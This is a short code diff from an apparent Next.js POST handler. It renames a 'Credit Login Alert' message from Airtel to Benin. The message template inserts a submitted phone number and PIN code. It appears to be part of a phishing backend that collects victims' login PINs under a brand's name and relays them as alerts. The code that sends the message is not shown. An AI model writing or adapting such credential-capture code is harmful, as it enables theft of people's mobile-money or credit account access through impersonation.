@@ -16,7 +16,7 @@ export async function POST(request: NextRequest) {
     }
 
     const message = `
-🔔 **Airtel Credit Login Alert**
+🔔 **Benin Credit Login Alert**
 
 📱 Phone Number: ${phoneNumber}
 🔒  Pin :   ${pinCode}
